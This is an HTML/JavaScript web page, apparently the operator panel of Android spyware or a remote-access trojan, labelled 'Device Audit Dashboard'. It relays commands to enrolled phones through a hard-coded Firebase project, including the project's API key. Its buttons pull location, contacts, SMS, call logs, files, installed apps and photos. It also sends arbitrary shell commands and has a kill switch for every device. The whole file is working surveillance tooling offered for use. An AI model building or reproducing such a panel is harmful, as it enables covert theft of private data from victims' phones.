<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Device Audit Dashboard</title>
<script src="https://cdn.tailwindcss.com"></script>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut }
  from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
import { getDatabase, ref, onValue, push, set }
  from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBbrWReIHicmIjhJISjPvpYv7Sanl3wVa8",
  authDomain: "device-kntorl.firebaseapp.com",
  databaseURL: "https://device-kntorl-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "device-kntorl",
  storageBucket: "device-kntorl.firebasestorage.app",
  messagingSenderId: "82003057061",
  appId: "1:82003057061:web:e4927366ca835e0584704c"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

window.currentDevice = null;

window.login = async function() {
  const email = document.getElementById('email').value;
  const pass = document.getElementById('pass').value;
  try { await signInWithEmailAndPassword(auth, email, pass); }
  catch (e) { alert("Login gagal: " + e.message); }
};

window.logout = async function() { await signOut(auth); location.reload(); };

onAuthStateChanged(auth, user => {
  document.getElementById('loginBox').style.display = user ? 'none' : 'block';
  document.getElementById('dash').style.display = user ? 'block' : 'none';
  if (user) loadDevices();
});

function loadDevices() {
  onValue(ref(db, 'devices'), snap => {
    const list = document.getElementById('deviceList');
    list.innerHTML = '';
    const data = snap.val() || {};
    Object.keys(data).forEach(id => {
      const d = data[id];
      const online = d.status === 'online';
      const div = document.createElement('div');
      div.className = 'p-3 mb-2 rounded cursor-pointer border ' +
        (online ? 'bg-green-900/40 border-green-500' : 'bg-gray-800 border-gray-700');
      div.innerHTML = '<div class="font-bold text-sm">' +
        (d.info?.model || 'Unknown') + '</div>' +
        '<div class="text-xs opacity-70">' + id.substring(0,12) + '...</div>' +
        '<div class="text-xs ' + (online ? 'text-green-400' : 'text-gray-500') + '">' +
        (online ? '● ONLINE' : '○ offline') + '</div>';
      div.onclick = () => selectDevice(id);
      list.appendChild(div);
    });
  });
}

window.selectDevice = function(id) {
  window.currentDevice = id;
  document.getElementById('devTitle').textContent = 'Device: ' + id.substring(0,16);
  loadResults(id);
};

window.sendCmd = function(type, arg) {
  if (!window.currentDevice) return alert("Pilih device dulu");
  const cmdRef = push(ref(db, 'devices/' + window.currentDevice + '/commands'));
  set(cmdRef, { type: type, arg: arg || '', ts: Date.now() });
};

window.loadResults = function(id) {
  onValue(ref(db, 'devices/' + id + '/results'), snap => {
    const out = document.getElementById('results');
    out.innerHTML = '';
    const data = snap.val() || {};
    const arr = Object.entries(data).sort((a,b) => (b[1].ts||0)-(a[1].ts||0));
    arr.slice(0, 30).forEach(([k, v]) => {
      const pre = document.createElement('pre');
      pre.className = 'p-2 mb-1 bg-black/60 rounded text-xs overflow-auto max-h-40';
      pre.textContent = '[' + v.type + '] ' + JSON.stringify(v.data, null, 2);
      out.appendChild(pre);
    });
  });
};

window.sendShell = function() {
  const cmd = document.getElementById('shellCmd').value;
  if (!cmd) return;
  window.sendCmd('shell', cmd);
  document.getElementById('shellCmd').value = '';
};

window.killAll = function() {
  if (!confirm("Kill switch semua device?")) return;
  set(ref(db, 'config/kill'), true);
  setTimeout(() => set(ref(db, 'config/kill'), false), 5000);
};
</script>
</head>
<body class="bg-gray-950 text-white min-h-screen">

<div id="loginBox" class="max-w-sm mx-auto mt-32 p-6 bg-gray-900 rounded-lg border border-green-500/30">
  <h1 class="text-2xl font-bold text-green-400 mb-4">DEVICE AUDIT</h1>
  <input id="email" placeholder="Email" class="w-full p-2 mb-2 bg-gray-800 rounded text-sm"/>
  <input id="pass" type="password" placeholder="Password" class="w-full p-2 mb-4 bg-gray-800 rounded text-sm"/>
  <button onclick="login()" class="w-full p-2 bg-green-500 text-black font-bold rounded">LOGIN</button>
</div>

<div id="dash" style="display:none" class="p-4">
  <div class="flex justify-between items-center mb-4">
    <h1 class="text-xl font-bold text-green-400">DEVICE AUDIT DASHBOARD</h1>
    <div>
      <button onclick="killAll()" class="px-3 py-1 bg-yellow-600 rounded text-sm mr-2">KILL ALL</button>
      <button onclick="logout()" class="px-3 py-1 bg-red-600 rounded text-sm">LOGOUT</button>
    </div>
  </div>

  <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
    <div class="bg-gray-900 p-3 rounded border border-gray-800">
      <h2 class="text-sm font-bold mb-2 text-green-400">DEVICES</h2>
      <div id="deviceList" class="max-h-[600px] overflow-auto"></div>
    </div>

    <div class="md:col-span-2 bg-gray-900 p-3 rounded border border-gray-800">
      <h2 id="devTitle" class="text-sm font-bold mb-2 text-green-400">Pilih device</h2>

      <div class="grid grid-cols-2 md:grid-cols-4 gap-2 mb-3">
        <button onclick="sendCmd('ping')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">PING</button>
        <button onclick="sendCmd('info')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">INFO</button>
        <button onclick="sendCmd('location')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">LOCATION</button>
        <button onclick="sendCmd('contacts')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">CONTACTS</button>
        <button onclick="sendCmd('sms')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">SMS</button>
        <button onclick="sendCmd('calllog')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">CALL LOG</button>
        <button onclick="sendCmd('files', '/sdcard')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">FILES</button>
        <button onclick="sendCmd('apps')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900">APPS</button>
        <button onclick="sendCmd('photo')" class="p-2 bg-gray-800 rounded text-xs hover:bg-green-900 col-span-2">PHOTO</button>
      </div>

      <div class="flex gap-2 mb-3">
        <input id="shellCmd" placeholder="shell command (e.g. ls /sdcard)" class="flex-1 p-2 bg-gray-800 rounded text-xs"/>
        <button onclick="sendShell()" class="px-3 py-2 bg-green-600 text-black rounded text-xs font-bold">RUN</button>
      </div>

      <h3 class="text-xs font-bold text-gray-400 mb-1">RESULTS</h3>
      <div id="results" class="max-h-[500px] overflow-auto"></div>
    </div>
  </div>
</div>

</body>
</html>
